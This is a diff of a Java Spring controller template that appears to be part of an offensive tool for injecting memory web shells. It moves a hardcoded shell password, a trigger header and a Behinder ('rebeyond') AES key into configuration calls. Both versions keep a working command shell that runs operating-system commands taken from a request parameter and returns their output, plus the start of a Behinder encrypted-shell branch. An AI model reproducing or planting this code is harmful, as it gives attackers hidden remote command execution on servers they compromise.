@@ -17,13 +17,9 @@ import java.util.Scanner;
 
 @Controller
 public class DynamicControllerTemplate {
-    private String basicCmdShellPwd;
-    private String behinderShellHeader;
     private Class myClassLoaderClazz;
 
     public DynamicControllerTemplate(){
-        this.basicCmdShellPwd = "pass";
-        this.behinderShellHeader = "X-Options-Ai";
         initialize();
     }
 
@@ -33,7 +29,7 @@ public class DynamicControllerTemplate {
 
         if(request.getParameter("type") != null && request.getParameter("type").equals("basic")){
             //basic cmd shell
-            String cmd = request.getParameter(basicCmdShellPwd);
+            String cmd = request.getParameter(Config.getPassword());
             if(cmd != null && !cmd.isEmpty()){
                 String[] cmds = null;
                 if(File.separator.equals("/")){
@@ -44,11 +40,11 @@ public class DynamicControllerTemplate {
                 String result = new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
                 response.getWriter().println(result);
             }
-        }else if(request.getHeader(behinderShellHeader) != null){
+        }else if(request.getHeader(Config.getHeader()) != null){
             //behind3 shell
             try{
                 if (request.getMethod().equals("POST")){
-                    String k="e45e329feb5d925b";/*rebeyond*/
+                    String k = Config.getBehinderShellPwdPwd();
                     request.getSession().setAttribute("u",k);
                     Cipher cipher = Cipher.getInstance("AES");
                     cipher.init(2, new SecretKeySpec((request.getSession().getAttribute("u") + "").getBytes(), "AES"));
